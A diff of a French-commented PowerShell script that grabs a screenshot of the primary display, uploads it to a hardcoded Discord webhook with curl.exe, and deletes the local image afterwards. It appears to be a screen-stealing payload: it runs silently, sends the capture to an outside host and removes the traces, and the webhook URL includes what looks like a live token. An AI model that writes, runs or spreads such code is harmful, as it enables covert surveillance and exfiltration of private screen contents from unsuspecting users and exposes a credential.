@@ -2,43 +2,25 @@
 $webhookUrl = "https://discord.com/api/webhooks/1450922309891391652/j_WkuEvDxWSNpICu5KBccsK1r4-nfRrIfZatPGyUPTQRWAQ9C0EZ3YXu2v5XgStzodPd"
 $screenshotPath = "$env:TEMP\screen.png"
 
-# 2. Capture d'écran (Utilise l'assemblage .NET pour l'image)
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
+# 2. Capture d'écran
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-$top    = $screen.Bounds.Top
-$left   = $screen.Bounds.Left
-$width  = $screen.Bounds.Width
-$height = $screen.Bounds.Height
-
-$bitmap = New-Object System.Drawing.Bitmap -ArgumentList $width, $height
+$bitmap = New-Object System.Drawing.Bitmap -ArgumentList $screen.Bounds.Width, $screen.Bounds.Height
 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
-
+$graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bitmap.Size)
 $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-
 $graphics.Dispose()
 $bitmap.Dispose()
 
-# 3. Envoi vers Discord via une requête Multipart
-$fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-$boundary = [System.Guid]::NewGuid().ToString()
-
-$body = (
-    "--$boundary`r`n" +
-    "Content-Disposition: form-data; name=`"payload_json`"`r`n`r`n" +
-    "{`"content`": `"📸 **Capture d'écran Windows (PS1) reçue !**`"}`r`n" +
-    "--$boundary`r`n" +
-    "Content-Disposition: form-data; name=`"file`"; filename=`"screen.png`"`r`n" +
-    "Content-Type: image/png`r`n`r`n"
-)
-
-$endBody = "`r`n--$boundary--`r`n"
-
-$postData = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($body) + $fileBytes + [System.Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($endBody)
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $postData
+# 3. Envoi vers Discord (Syntaxe simplifiée pour éviter les erreurs de guillemets)
+try {
+    # On envoie juste le fichier, Discord affichera le nom du fichier par défaut
+    & curl.exe -F "file=@$screenshotPath" $webhookUrl
+    Write-Host "`nSucces : Image envoyee." -ForegroundColor Green
+}
+catch {
+    Write-Host "`nErreur : $($_.Exception.Message)" -ForegroundColor Red
+}
 
 # 4. Nettoyage
-Remove-Item $screenshotPath
+if (Test-Path $screenshotPath) { Remove-Item $screenshotPath }
